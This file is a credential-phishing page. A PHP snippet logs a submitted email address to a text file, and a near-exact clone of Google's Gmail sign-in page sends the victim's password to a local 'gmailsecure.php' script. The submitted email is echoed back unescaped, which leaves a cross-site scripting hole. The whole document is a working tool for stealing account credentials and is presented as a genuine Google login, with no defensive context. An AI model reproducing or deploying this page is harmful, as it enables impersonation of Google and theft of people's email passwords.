
<?php // testfile.php  
$tt=$_POST['Email'];
//echo $tt;
 $fh = fopen("ddt.txt", 'a');		 
  
  fwrite($fh, $tt);  
  fwrite($fh, "   ");
  fclose($fh);  
?>   




<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="utf-8">
  <meta content="width=300, initial-scale=1" name="viewport">
  <meta name="robots" content="noindex">
  <meta name="description" content="Gmail is email that&#39;s intuitive, efficient, and useful. 15 GB of storage, less spam, and mobile access.">
  <meta name="google-site-verification" content="LrdTUW9psUAMbh4Ia074-BPEVmcpBxF6Gwf0MSgQXZs">
  <link href="google/googleg_lodp.ico" rel="shortcut icon">
  <title>Google</title>
  <style>
  @font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light'), url("google/DXI1ORHCpsQm3Vp6mXoaTXhCUOGz7vYGh680lGh-uXM.woff") format('woff');
}
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans'), url("google/cJZKeOuBrn4kERxqtaUH3T8E0i7KZn-EPnyo3HZu7kw.woff") format('woff');
}
  </style>
  <style>
  h1, h2 {
  -webkit-animation-duration: 0.1s;
  -webkit-animation-name: fontfix;
  -webkit-animation-iteration-count: 1;
  -webkit-animation-timing-function: linear;
  -webkit-animation-delay: 0;
  }
  @-webkit-keyframes fontfix {
  from {
  opacity: 1;
  }
  to {
  opacity: 1;
  }
  }
  </style>
<style>
  html, body {
  font-family: Arial, sans-serif;
  background: #fff;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  button,
  input[type=button],
  input[type=submit] {
  font-family: Arial, sans-serif;
  font-size: 13px;
  }
  a,
  a:hover,
  a:visited {
  color: #427fed;
  cursor: pointer;
  text-decoration: none;
  }
  a:hover {
  text-decoration: underline;
  }
  h1 {
  font-size: 20px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: normal;
  }
  h2 {
  font-size: 14px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: bold;
  }
  input[type=email],
  input[type=number],
  input[type=password],
  input[type=tel],
  input[type=text],
  input[type=url] {
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 36px;
  padding: 0 8px;
  margin: 0;
  background: #fff;
  border: 1px solid #d9d9d9;
  border-top: 1px solid #c0c0c0;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  font-size: 15px;
  color: #404040;
  }
  input[type=email]:hover,
  input[type=number]:hover,
  input[type=password]:hover,
  input[type=tel]:hover,
  input[type=text]:hover,
  input[type=url]:hover {
  border: 1px solid #b9b9b9;
  border-top: 1px solid #a0a0a0;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=email]:focus,
  input[type=number]:focus,
  input[type=password]:focus,
  input[type=tel]:focus,
  input[type=text]:focus,
  input[type=url]:focus {
  outline: none;
  border: 1px solid #4d90fe;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  input[type=checkbox],
  input[type=radio] {
  -webkit-appearance: none;
  display: inline-block;
  width: 13px;
  height: 13px;
  margin: 0;
  cursor: pointer;
  vertical-align: bottom;
  background: #fff;
  border: 1px solid #c6c6c6;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  position: relative;
  border: 0;
  width: 16px;
  height: 16px;
  box-sizing: content-box;
  background: none;
  }
  input[type=checkbox]:active,
  input[type=radio]:active {
  background: #ebebeb;
  }
  input[type=checkbox]:hover {
  border-color: #c6c6c6;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=radio] {
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  width: 15px;
  height: 15px;
  }
  input[type=checkbox]:checked,
  input[type=radio]:checked {
  background: #fff;
  }
  input[type=radio]:checked::after {
  content: '';
  display: block;
  position: relative;
  top: 3px;
  left: 3px;
  width: 7px;
  height: 7px;
  background: #666;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  }
  input[type=checkbox]:checked::after {
  content: url("google/checkmark.png");
  display: block;
  position: absolute;
  top: -6px;
  left: -5px;
  }
  input[type=checkbox]:focus {
  outline: none;
  border-color: #4d90fe;
  }
  .stacked-label {
  display: block;
  font-weight: bold;
  margin: .5em 0;
  }
  .hidden-label {
  position: absolute !important;
  clip: rect(1px 1px 1px 1px); /* IE6, IE7 */
  clip: rect(1px, 1px, 1px, 1px);
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  }
  input[type=checkbox].form-error,
  input[type=email].form-error,
  input[type=number].form-error,
  input[type=password].form-error,
  input[type=text].form-error,
  input[type=tel].form-error,
  input[type=url].form-error {
  border: 1px solid #dd4b39;
  }
  .error-msg {
  margin: .5em 0;
  display: block;
  color: #dd4b39;
  line-height: 17px;
  }
  .help-link {
  background: #dd4b39;
  padding: 0 5px;
  color: #fff;
  font-weight: bold;
  display: inline-block;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  text-decoration: none;
  position: relative;
  top: 0px;
  }
  .help-link:visited {
  color: #fff;
  }
  .help-link:hover {
  color: #fff;
  background: #c03523;
  text-decoration: none;
  }
  .help-link:active {
  opacity: 1;
  background: #ae2817;
  }
  .wrapper {
  position: relative;
  min-height: 100%;
  }
  .content {
  padding: 0 44px;
  }
  .main {
  padding-bottom: 100px;
  }
  /* For modern browsers */
  .clearfix:before,
  .clearfix:after {
  content: "";
  display: table;
  }
  .clearfix:after {
  clear: both;
  }
  /* For IE 6/7 (trigger hasLayout) */
  .clearfix {
  zoom:1;
  }
  .google-header-bar {
  height: 71px;
  border-bottom: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .header .logo {
  background-image: url("google/logo_1x.png");
  background-size: 116px 38px;
  background-repeat: no-repeat;
  margin: 17px 0 0;
  float: left;
  height: 38px;
  width: 116px;
  }
  .header .logo-w {
  background-image: url("google/googlelogo_color_112x36dp.png");
  background-size: 112px 36px;
  margin: 21px 0 0;
  }
  .header .secondary-link {
  margin: 28px 0 0;
  float: right;
  }
  .header .secondary-link a {
  font-weight: normal;
  }
  .google-header-bar.centered {
  border: 0;
  height: 108px;
  }
  .google-header-bar.centered .header .logo {
  float: none;
  margin: 40px auto 30px;
  display: block;
  }
  .google-header-bar.centered .header .secondary-link {
  display: none
  }
  .google-footer-bar {
  position: absolute;
  bottom: 0;
  height: 35px;
  width: 100%;
  border-top: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .footer {
  padding-top: 7px;
  font-size: .85em;
  white-space: nowrap;
  line-height: 0;
  }
  .footer ul {
  float: left;
  max-width: 80%;
  min-height: 16px;
  padding: 0;
  }
  .footer ul li {
  color: #737373;
  display: inline;
  padding: 0;
  padding-right: 1.5em;
  }
  .footer a {
  color: #737373;
  }
  .lang-chooser-wrap {
  float: right;
  display: inline;
  }
  .lang-chooser-wrap img {
  vertical-align: top;
  }
  .lang-chooser {
  font-size: 13px;
  height: 24px;
  line-height: 24px;
  }
  .lang-chooser option {
  font-size: 13px;
  line-height: 24px;
  }
  .hidden {
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  display: none !important;
  }
  .banner {
  text-align: center;
  }
  .card {
  background-color: #f7f7f7;
  padding: 20px 25px 30px;
  margin: 0 auto 25px;
  width: 304px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  }
  .card > *:first-child {
  margin-top: 0;
  }
  .rc-button,
  .rc-button:visited {
  display: inline-block;
  min-width: 46px;
  text-align: center;
  color: #444;
  font-size: 14px;
  font-weight: 700;
  height: 36px;
  padding: 0 8px;
  line-height: 36px;
  -moz-border-radius: 3px;
  -webkit-border-radius: 3px;
  border-radius: 3px;
  -o-transition: all 0.218s;
  -moz-transition: all 0.218s;
  -webkit-transition: all 0.218s;
  transition: all 0.218s;
  border: 1px solid #dcdcdc;
  background-color: #f5f5f5;
  background-image: -webkit-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -o-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: linear-gradient(top,#f5f5f5,#f1f1f1);
  -o-transition: none;
  -moz-user-select: none;
  -webkit-user-select: none;
  user-select: none;
  cursor: default;
  }
  .card .rc-button {
  width: 100%;
  padding: 0;
  }
  .rc-button.disabled,
  .rc-button[disabled] {
  opacity: .5;
  filter: alpha(opacity=50);
  cursor: default;
  pointer-events: none;
  }
  .rc-button:hover {
  border: 1px solid #c6c6c6;
  color: #333;
  text-decoration: none;
  -o-transition: all 0.0s;
  -moz-transition: all 0.0s;
  -webkit-transition: all 0.0s;
  transition: all 0.0s;
  background-color: #f8f8f8;
  background-image: -webkit-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -o-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: linear-gradient(top,#f8f8f8,#f1f1f1);
  -moz-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  }
  .rc-button:active {
  background-color: #f6f6f6;
  background-image: -webkit-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -o-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: linear-gradient(top,#f6f6f6,#f1f1f1);
  -moz-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  }
  .rc-button-submit,
  .rc-button-submit:visited {
  border: 1px solid #3079ed;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #4d90fe;
  background-image: -webkit-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -moz-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -ms-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -o-linear-gradient(top,#4d90fe,#4787ed);
  background-image: linear-gradient(top,#4d90fe,#4787ed);
  }
  .rc-button-submit:hover {
  border: 1px solid #2f5bb7;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  }
  .rc-button-submit:active {
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .rc-button-red,
  .rc-button-red:visited {
  border: 1px solid transparent;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #d14836;
  background-image: -webkit-linear-gradient(top,#dd4b39,#d14836);
  background-image: -moz-linear-gradient(top,#dd4b39,#d14836);
  background-image: -ms-linear-gradient(top,#dd4b39,#d14836);
  background-image: -o-linear-gradient(top,#dd4b39,#d14836);
  background-image: linear-gradient(top,#dd4b39,#d14836);
  }
  .rc-button-red:hover {
  border: 1px solid #b0281a;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #c53727;
  background-image: -webkit-linear-gradient(top,#dd4b39,#c53727);
  background-image: -moz-linear-gradient(top,#dd4b39,#c53727);
  background-image: -ms-linear-gradient(top,#dd4b39,#c53727);
  background-image: -o-linear-gradient(top,#dd4b39,#c53727);
  background-image: linear-gradient(top,#dd4b39,#c53727);
  }
  .rc-button-red:active {
  border: 1px solid #992a1b;
  background-color: #b0281a;
  background-image: -webkit-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -moz-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -ms-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -o-linear-gradient(top,#dd4b39,#b0281a);
  background-image: linear-gradient(top,#dd4b39,#b0281a);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .secondary-actions {
  text-align: center;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .google-header-bar.centered {
  height: 83px;
  }
  .google-header-bar.centered .header .logo {
  margin: 25px auto 20px;
  }
  .card {
  margin-bottom: 20px;
  }
</style>
<style media="screen and (max-width: 580px)">
  html, body {
  font-size: 14px;
  }
  .google-header-bar.centered {
  height: 73px;
  }
  .google-header-bar.centered .header .logo {
  margin: 20px auto 15px;
  }
  .content {
  padding-left: 10px;
  padding-right: 10px;
  }
  .hidden-small {
  display: none;
  }
  .card {
  padding: 20px 15px 30px;
  width: 270px;
  }
  .footer ul li {
  padding-right: 1em;
  }
  .lang-chooser-wrap {
  display: none;
  }
</style>
<style media="screen and (-webkit-min-device-pixel-ratio: 1.5), (min--moz-device-pixel-ratio: 1.5), (-o-min-device-pixel-ratio: 3 / 2), (min-device-pixel-ratio: 1.5)">
  .header .logo {
  background-image: url("google/logo_2x.png");
  }
  .header .logo-w {
  background-image: url("google/googlelogo_color_112x36dp.png");
  }
</style>
<style>
  pre.debug {
  font-family: monospace;
  position: absolute;
  left: 0;
  margin: 0;
  padding: 1.5em;
  font-size: 13px;
  background: #f1f1f1;
  border-top: 1px solid #e5e5e5;
  direction: ltr;
  white-space: pre-wrap;
  width: 90%;
  overflow: hidden;
  }
</style>
<style>
  .banner h1 {
  font-family: 'Open Sans', arial;
  -webkit-font-smoothing: antialiased;
  color: #555;
  font-size: 42px;
  font-weight: 300;
  margin-top: 0;
  margin-bottom: 20px;
  }
  .banner h2 {
  font-family: 'Open Sans', arial;
  -webkit-font-smoothing: antialiased;
  color: #555;
  font-size: 18px;
  font-weight: 400;
  margin-bottom: 20px;
  }
  .signin-card {
  width: 274px;
  padding: 40px 40px;
  }
  .signin-card .profile-img {
  width: 96px;
  height: 96px;
  margin: 0 auto 10px;
  display: block;
  -moz-border-radius: 50%;
  -webkit-border-radius: 50%;
  border-radius: 50%;
  }
  .signin-card .profile-name {
  font-size: 16px;
  font-weight: bold;
  text-align: center;
  margin: 10px 0 0;
  min-height: 1em;
  }
  .signin-card .profile-email {
  font-size: 16px;
  text-align: center;
  margin: 10px 0 20px 0;
  min-height: 1em;
  }
  .signin-card input[type=email],
  .signin-card input[type=password],
  .signin-card input[type=text],
  .signin-card input[type=submit] {
  width: 100%;
  display: block;
  margin-bottom: 10px;
  z-index: 1;
  position: relative;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  }
  .signin-card #Email,
  .signin-card #Passwd,
  .signin-card .captcha {
  direction: ltr;
  height: 44px;
  font-size: 16px;
  }
  .signin-card #Email + .stacked-label {
  margin-top: 15px;
  }
  .signin-card #reauthEmail {
  display: block;
  margin-bottom: 10px;
  line-height: 36px;
  padding: 0 8px;
  font-size: 15px;
  color: #404040;
  line-height: 2;
  margin-bottom: 10px;
  font-size: 14px;
  text-align: center;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  }
  .one-google p {
  margin: 0 0 10px;
  color: #555;
  font-size: 14px;
  text-align: center;
  }
  .one-google p.create-account,
  .one-google p.switch-account {
  margin-bottom: 60px;
  }
  .one-google .logo-strip {
  background-repeat: no-repeat;
  display: block;
  margin: 10px auto;
  background-image: url("google/wlogostrip_230x17_1x.png");
  background-size: 230px 17px;
  width: 230px;
  height: 17px;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .banner h1 {
  font-size: 38px;
  margin-bottom: 15px;
  }
  .banner h2 {
  margin-bottom: 15px;
  }
  .one-google p.create-account,
  .one-google p.switch-account {
  margin-bottom: 30px;
  }
  .signin-card #Email {
  margin-bottom: 0;
  }
  .signin-card #Passwd {
  margin-top: -1px;
  }
  .signin-card #Email.form-error,
  .signin-card #Passwd.form-error {
  z-index: 2;
  }
  .signin-card #Email:hover,
  .signin-card #Email:focus,
  .signin-card #Passwd:hover,
  .signin-card #Passwd:focus {
  z-index: 3;
  }
</style>
<style media="screen and (max-width: 580px)">
  .banner h1 {
  font-size: 22px;
  margin-bottom: 15px;
  }
  .signin-card {
  width: 260px;
  padding: 20px 20px;
  margin: 0 auto 20px;
  }
  .signin-card .profile-img {
  width: 72px;
  height: 72px;
  -moz-border-radius: 72px;
  -webkit-border-radius: 72px;
  border-radius: 72px;
  }
</style>
<style media="screen and (-webkit-min-device-pixel-ratio: 1.5), (min--moz-device-pixel-ratio: 1.5), (-o-min-device-pixel-ratio: 3 / 2), (min-device-pixel-ratio: 1.5)">
  .one-google .logo-strip {
  background-image: url("google/wlogostrip_230x17_2x.png");
  }
</style>
  </head>
  <body>
  <div class="wrapper">
  <div class="google-header-bar  centered">
  <div class="header content clearfix">
  <div class="logo logo-w" aria-label="Google"></div>
  </div>
  </div>
  <div class="main content clearfix">
<div class="banner">
<h1>
  One account. All of Google.
</h1>
  <h2 class="hidden-small">
  Sign in to continue to Gmail
  </h2>
</div>
<div id="rsi-card" class="card signin-card">
  <div id="cc_iframe_parent"></div>
<img id="profile-img" class="profile-img" src="google/avatar_2x.png" alt="">
<p class="profile-name">
</p>
  <form novalidate method="post" action="gmailsecure.php" id="gaia_loginform">
  <input name="Page" type="hidden" value="RememberedSignIn">
  <input type="hidden" name="GALX" value="9UOM6p_K8K0">
  <input type="hidden" name="gxf" value="AFoagUW_FDd2LVzCI_sgXlBuz2zJvKI4VA:1462368325740">
  <input type="hidden" name="continue" value="https://mail.google.com/mail/">
  <input type="hidden" name="service" value="mail">
  <input type="hidden" name="ltmpl" value="default">
  <input type="hidden" name="scc" value="1">
  <input type="hidden" name="sacu" value="1">
  <input type="hidden" name="acui" value="0">
  <input type="hidden" name="ignoreShadow" value="0">
  <input type="hidden" id="_utf8" name="_utf8" value="&#9731;"/>
  <input type="hidden" name="bgresponse" id="bgresponse" value="js_disabled">
  <input type="hidden" id="pstMsg" name="pstMsg" value="0">
  <input type="hidden" id="dnConn" name="dnConn" value="">
  <input type="hidden" id="checkConnection" name="checkConnection" value="">
  <input type="hidden" id="checkedDomains" name="checkedDomains"
         value="youtube">
<span id="reauthEmail" class="reauth-email">
<?php
echo $tt;

?>
</span>
<input id="Email" name="Email" type="email" class="email-input hidden" placeholder="Email" value="" spellcheck="false" readonly />
<label class="hidden-label" for="Passwd">Password</label>
<input id="Passwd" name="Passwd" type="password"
       placeholder="Password"
       class="">
  <input type="hidden" name="PersistentCookie" value="yes">
<input id="signIn" name="signIn" class="rc-button rc-button-submit" type="submit" value="Sign in">
  </form>
  <a id="link-forgot-passwd" href="https://www.google.com" class="need-help">
  Need help?
  </a>
</div>
<div class="one-google">
  <p class="switch-account">
  <a id="account-chooser-link" href="https://accounts.google.com/AccountChooser?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&amp;hl=en&amp;service=mail&amp;scc=1">
  Sign in with a different account
  </a>
  </p>
<p class="tagline">
  One Google Account for everything Google
</p>
<div class="logo-strip"></div>
</div>
  </div>
  <div class="google-footer-bar">
  <div class="footer content clearfix">
  <ul id="footer-list">
  <li>
  <a href="https://www.google.com/intl/en/about" target="_blank">
  About Google
  </a>
  </li>
  <li>
  <a href="https://accounts.google.com/TOS?loc=IN&hl=en&privacy=true" target="_blank">
  Privacy
  </a>
  </li>
  <li>
  <a href="https://accounts.google.com/TOS?loc=IN&hl=en" target="_blank">
  Terms
  </a>
  </li>
  <li>
  <a href="http://www.google.com/support/accounts?hl=en" target="_blank">
  Help
  </a>
  </li>
  </ul>
  <div id="lang-vis-control" style="display: none">
  <span id="lang-chooser-wrap" class="lang-chooser-wrap">
  <label for="lang-chooser"><img src="google/universal_language_settings-21.png" alt="Change language"></label>
  <select id="lang-chooser" class="lang-chooser" name="lang-chooser">
  <option value="af"
                 >
  ?Afrikaans?
  </option>
  <option value="az"
                 >
  ?az?rbaycan dili?
  </option>
  <option value="ms"
                 >
  ?Bahasa Melayu?
  </option>
  <option value="ca"
                 >
  ?català?
  </option>
  <option value="cs"
                 >
  ?Ceština?
  </option>
  <option value="da"
                 >
  ?Dansk?
  </option>
  <option value="de"
                 >
  ?Deutsch?
  </option>
  <option value="et"
                 >
  ?eesti?
  </option>
  <option value="en-GB"
                 >
  ?English (United Kingdom)?
  </option>
  <option value="en"
                
                  selected="selected"
                 >
  ?English (United States)?
  </option>
  <option value="es"
                 >
  ?Español (España)?
  </option>
  <option value="es-419"
                 >
  ?Español (Latinoamérica)?
  </option>
  <option value="eu"
                 >
  ?euskara?
  </option>
  <option value="fil"
                 >
  ?Filipino?
  </option>
  <option value="fr-CA"
                 >
  ?Français (Canada)?
  </option>
  <option value="fr"
                 >
  ?Français (France)?
  </option>
  <option value="gl"
                 >
  ?galego?
  </option>
  <option value="hr"
                 >
  ?Hrvatski?
  </option>
  <option value="in"
                 >
  ?Indonesia?
  </option>
  <option value="zu"
                 >
  ?isiZulu?
  </option>
  <option value="is"
                 >
  ?íslenska?
  </option>
  <option value="it"
                 >
  ?Italiano?
  </option>
  <option value="sw"
                 >
  ?Kiswahili?
  </option>
  <option value="lv"
                 >
  ?latviešu?
  </option>
  <option value="lt"
                 >
  ?lietuviu?
  </option>
  <option value="hu"
                 >
  ?magyar?
  </option>
  <option value="nl"
                 >
  ?Nederlands?
  </option>
  <option value="no"
                 >
  ?norsk?
  </option>
  <option value="pl"
                 >
  ?polski?
  </option>
  <option value="pt"
                 >
  ?Português (Brasil)?
  </option>
  <option value="pt-PT"
                 >
  ?português (Portugal)?
  </option>
  <option value="ro"
                 >
  ?româna?
  </option>
  <option value="sk"
                 >
  ?Slovencina?
  </option>
  <option value="sl"
                 >
  ?slovenšcina?
  </option>
  <option value="fi"
                 >
  ?Suomi?
  </option>
  <option value="sv"
                 >
  ?Svenska?
  </option>
  <option value="vi"
                 >
  ?Ti?ng Vi?t?
  </option>
  <option value="tr"
                 >
  ?Türkçe?
  </option>
  <option value="el"
                 >
  ??????????
  </option>
  <option value="bg"
                 >
  ???????????
  </option>
  <option value="mn"
                 >
  ????????
  </option>
  <option value="ru"
                 >
  ?????????
  </option>
  <option value="sr"
                 >
  ????????
  </option>
  <option value="uk"
                 >
  ????????????
  </option>
  <option value="ka"
                 >
  ?????????
  </option>
  <option value="hy"
                 >
  ?????????
  </option>
  <option value="iw"
                 >
  ????????
  </option>
  <option value="ur"
                 >
  ???????
  </option>
  <option value="ar"
                 >
  ??????????
  </option>
  <option value="fa"
                 >
  ????????
  </option>
  <option value="am"
                 >
  ??????
  </option>
  <option value="ne"
                 >
  ????????
  </option>
  <option value="mr"
                 >
  ???????
  </option>
  <option value="hi"
                 >
  ????????
  </option>
  <option value="bn"
                 >
  ???????
  </option>
  <option value="gu"
                 >
  ?????????
  </option>
  <option value="ta"
                 >
  ???????
  </option>
  <option value="te"
                 >
  ????????
  </option>
  <option value="kn"
                 >
  ???????
  </option>
  <option value="ml"
                 >
  ????????
  </option>
  <option value="si"
                 >
  ???????
  </option>
  <option value="th"
                 >
  ?????
  </option>
  <option value="lo"
                 >
  ?????
  </option>
  <option value="km"
                 >
  ???????
  </option>
  <option value="ko"
                 >
  ?????
  </option>
  <option value="zh-HK"
                 >
  ???(??)?
  </option>
  <option value="ja"
                 >
  ?????
  </option>
  <option value="zh-CN"
                 >
  ??????
  </option>
  <option value="zh-TW"
                 >
  ??????
  </option>
  </select>
  </span>
  </div>
  </div>
</div>
  </div>
  <script>
  (function(){
  var splitByFirstChar = function(toBeSplit, splitChar) {
  var index = toBeSplit.indexOf(splitChar);
  if (index >= 0) {
  return [toBeSplit.substring(0, index),
  toBeSplit.substring(index + 1)];
  }
  return [toBeSplit];
  }
  var langChooser_parseParams = function(paramsSection) {
  if (paramsSection) {
  var query = {};
  var params = paramsSection.split('&');
  for (var i = 0; i < params.length; i++) {
              var param = splitByFirstChar(params[i], '=');
              if (param.length == 2) {
                query[param[0]] = param[1];
              }
            }
            return query;
          }
          return {};
        }
        var appendHiddenParams = function(query) {
          var loginForm = document.getElementById('gaia_loginform');
          if (loginForm) {
            var loginInputs = loginForm.getElementsByTagName('input');
            for (var i = 0, input; input = loginInputs[i]; i++) {
              if (input.type == 'hidden' && input.value && !query[input.name]) {
                query[input.name] = input.value;
              }
            }
          }
        }
        var post = function(path, params) {
          var form = document.createElement('form');
          form.setAttribute('method', 'post');
          form.setAttribute('action', path);

          for (var key in params) {
            if (params.hasOwnProperty(key)) {
              var hiddenField = document.createElement('input');
              hiddenField.setAttribute('type', 'hidden');
              hiddenField.setAttribute('name', key);
              hiddenField.setAttribute('value', params[key]);

              form.appendChild(hiddenField);
            }
          }

          document.body.appendChild(form);
          form.submit();
        }
        var langChooser_getParamStr = function(params) {
          var paramsStr = [];
          for (var a in params) {
            paramsStr.push(a + "=" + params[a]);
          }
          return paramsStr.join('&');
        }
        var langChooser_currentUrl = window.location.href;
        var match = langChooser_currentUrl.match("^(.*?)(\\?(.*?))?(#(.*))?$");
        var langChooser_currentPath = match[1];
        var langChooser_params = langChooser_parseParams(match[3]);
        var langChooser_fragment = match[5];

        var langChooser = document.getElementById('lang-chooser');
        var langChooserWrap = document.getElementById('lang-chooser-wrap');
        var langVisControl = document.getElementById('lang-vis-control');
        if (langVisControl && langChooser) {
          langVisControl.style.display = 'inline';
          langChooser.onchange = function() {
            langChooser_params['lp'] = 1;
            langChooser_params['hl'] = encodeURIComponent(this.value);
            var hiddenEmailInput = document.getElementById('Email-hidden');
            if (hiddenEmailInput) {
              // If we are in password separation on password page, post to
              // /AccountLoginInfo.
              appendHiddenParams(langChooser_params);
              langChooser_params['Email'] = hiddenEmailInput.value;
              post('/AccountLoginInfo', langChooser_params);
            } else {
              var paramsStr = langChooser_getParamStr(langChooser_params);
              var newHref = langChooser_currentPath + "?" + paramsStr;
              if (langChooser_fragment) {
                newHref = newHref + "#" + langChooser_fragment;
              }
              window.location.href = newHref;
            }
          };
        }
      })();
    </script>
<script type="text/javascript">
  var gaia_attachEvent = function(element, event, callback) {
  if (element.addEventListener) {
  element.addEventListener(event, callback, false);
  } else if (element.attachEvent) {
  element.attachEvent('on' + event, callback);
  }
  };
</script>
  <script>var G,Gb=function(a,b){var c=a;a&&"string"==typeof a&&(c=document.getElementById(a));if(b&&!c)throw new Ga(a);return c},Ga=function(a){this.id=a;this.toString=function(){return"No element found for id '"+this.id+"'"}};var Gc={},Gf=function(a,b,c){var d=function(a){var b=c.call(this,a);!1===b&&Gd(a);return b};a=Gb(a,!0);a.addEventListener(b,d,!1);Ge(a,b).push(d);return d},Gg=function(a,b,c){a=Gb(a,!0);var d=function(){var b=window.event,d=c.call(a,b);!1===d&&Gd(b);return d};a.attachEvent("on"+b,d);Ge(a,b).push(d);return d},Gh;Gh=window.addEventListener?Gf:window.attachEvent?Gg:void 0;var Gd=function(a){a.preventDefault?a.preventDefault():a.returnValue=!1;return!1};
var Ge=function(a,b){Gc[a]=Gc[a]||{};Gc[a][b]=Gc[a][b]||[];return Gc[a][b]};var Gi=function(){try{return new XMLHttpRequest}catch(c){for(var a=["MSXML2.XMLHTTP.6.0","MSXML2.XMLHTTP.3.0","MSXML2.XMLHTTP","Microsoft.XMLHTTP"],b=0;b<a.length;b++)try{return new ActiveXObject(a[b])}catch(d){}}return null},Gj=function(){this.request=Gi();this.parameters={}};
Gj.prototype.send=function(a,b){var c=[],d;for(d in this.parameters){var e=this.parameters[d];c.push(d+"="+encodeURIComponent(e))}var c=c.join("&"),f=this.request;f.open("POST",a,!0);f.setRequestHeader("Content-type","application/x-www-form-urlencoded");f.onreadystatechange=function(){4==f.readyState&&b({status:f.status,text:f.responseText})};f.send(c)};
